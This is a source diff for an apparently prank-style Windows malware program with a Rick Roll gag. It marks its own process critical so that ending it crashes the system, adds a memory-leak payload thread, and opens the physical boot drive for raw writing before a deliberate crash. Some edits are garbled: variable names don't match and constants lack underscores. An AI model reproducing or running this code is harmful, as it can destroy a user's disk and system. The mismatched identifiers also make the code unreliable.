@@ -1,3 +1,5 @@
+#pragma comment(lib, "Winmm.lib")
+
 #include <iostream>
 #include <Windows.h>
 #include <math.h>
@@ -60,11 +62,19 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
         ExitProcess(0);
     }
 
+    BOOL playmusic = TRUE;
+
+    if (MessageBoxW(NULL, L"Are you recording a video that you plan to upload to YouTube and monetize? We need to know this because this program contains copyrighted music.", L"Copyright warning", MB_YESNO | MB_ICONEXCLAMATION) == IDYES)
+    {
+        playmusic = FALSE;
+    }
+
     functionarray payloads[] = {
         startcalc,
         p1,
         p2,
-        p3
+        p3,
+        p4
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
 
     HMODULE ntdll = LoadLibraryA("ntdll.dll");
@@ -73,7 +83,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     fnNtSetInformationProcess NtSetInformationProcess = (fnNtSetInformationProcess)GetProcAddress(ntdll, "NtSetInformationProcess");
     
     BOOLEAN bOld1;
-    ULONG ulBreakOnTermination1 = 1;
+    ULONG ulBreNakOnTermination1 = 1;
     RtlAdjustPrivilege(20, TRUE, FALSE, &bOld1);
     NtSetInformationProcess(GetCurrentProcess(), 0x1D, &ulBreakOnTermination1, sizeof(ULONG));
 
@@ -87,11 +97,20 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     HANDLE hmsg1 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msglol, NULL, NULL);
 
     //rick roll
-    ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_SHOWDEFAULT);
+    //ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_SHOWDEFAULT);
+
+    if (playmusic) {
+        mciSendString("open \"rick.mp3\" type mpegvideo alias mp3", NULL, 0, NULL);
+        mciSendString("play mp3", NULL, 0, NULL);
+        MessageBoxW(NULL, L"Get rick rolled", L"NEVER GONNA GIVE YOU UP", MBYESNO | MBICONEXCLAMATION);
+        mciSendString("stop mp3", NULL, 0, NULL);
+    } //add music soon, get better method
 
     HANDLE hAudio = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)audio, NULL, 0, NULL);
 
-    HANDLE calc = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[0], NULL, 0, NULL);
+    //HANDLE calc = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[0], NULL, 0, NULL);
+
+    HANDLE hLeakRAM = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[4], NULL, 0, NULL);
 
     DWORD dwBytesWritten;
     HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
@@ -207,6 +226,8 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
     TerminateThread(hAudio, 1); //literally not safe
     CloseHandle(hAudio);
+    CloseHandle(hLeakRam);
+    TerminateThread(hLeakRam, 1);
 
     //crash
     BOOLEAN bOld2;
@@ -216,4 +237,3 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     FreeLibrary(ntdll);
     return 0;
 }
-
